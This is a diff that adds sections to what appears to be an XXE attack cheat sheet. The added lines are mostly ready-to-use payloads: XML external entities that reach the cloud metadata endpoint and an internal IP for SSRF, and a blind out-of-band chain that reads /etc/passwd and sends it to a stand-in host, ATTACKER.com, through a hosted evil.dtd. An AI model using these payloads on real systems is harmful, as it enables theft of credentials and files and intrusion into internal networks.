@@ -29,8 +29,30 @@ Converted to THis ---|>
 </stockCheck>
 ```
 --------------------------------------------------------------
-
-
+Exploiting XXE to perform SSRF attacks
+Cloud internal meta-data
+```
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
+```
+```
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://192.168.1.1:80/"> ]>
+```
+-------------------------------------------------------------------
+Blind XXE to SSRF
+When responses aren't shown, use out-of-band (OOB) techniques:
+```
+<!DOCTYPE test [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://ATTACKER.com/evil.dtd">
+  %dtd;
+]>
+```
+evil.dtd on attacker server:
+```
+<!ENTITY % exfil SYSTEM "http://ATTACKER.com/exfil?data=%file;">
+%exfil;
+```
+--------------------------------------------------------------
 
 
 
